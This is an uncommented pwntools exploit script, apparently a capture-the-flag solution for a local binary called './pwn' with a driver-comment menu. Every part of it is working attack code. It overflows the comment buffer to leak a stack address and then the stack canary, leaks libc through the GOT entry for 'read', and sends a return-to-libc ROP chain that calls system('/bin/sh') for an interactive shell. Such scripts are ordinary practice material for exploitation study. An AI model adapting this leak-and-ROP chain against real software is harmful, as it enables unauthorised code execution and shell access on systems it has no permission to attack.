from pwn import *
context.log_level = "debug"
sh=process("./pwn")
elf = ELF("./pwn")
rdi = 0x0000000000401713
ret=rdi+1
sh.sendlineafter(b"Driver name >> ",b"nihshais")
sh.sendlineafter(b"Driver year >> ",b"9")
sh.sendlineafter(b"Driver comment >> ",b"wohao")

def cmd(c):
    sh.sendlineafter(b">> ",str(c).encode())
def edit(pay):
    cmd(1)
    sh.sendlineafter(b"Input new comment >>", pay)
def show():
    cmd(2)

payload=b'wohaonij'+b'wohaonij'+b'\xc0'
edit(payload)
show()
sh.recvuntil(b"Your name : ")
leak_stack=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leakstack:"+hex(leak_stack))

name=leak_stack+0x20
canary=leak_stack+0x38
payload=b'wohaonij'+b'wohaonij'+p64(canary)
edit(payload)
show()
sh.recvuntil(b"Your name : ")
canary=u64(sh.recv(8).rjust(8,b'\x00'))
success("canary:"+hex(canary))

payload=b'wohaonij'+b'wohaonij'+p64(elf.got['read'])
edit(payload)
show()
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
libc=ELF("/home/ubuntu/Tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
libcbase=leak_libc-libc.sym['read']
success("libcabse:"+hex(libcbase))
system=libcbase+libc.sym['system']
binsh=libcbase+libc.search(b"/bin/sh").__next__()

payload=b'wohaonij'+b'wohaonij'+p64(name)+p64(5)+b'wohao\x00ij'*3+p64(canary)+b'a'*24+p64(rdi)+p64(binsh)+p64(ret)+p64(system)
edit(payload)

cmd(0)
# gdb.attach(sh)
sh.interactive()
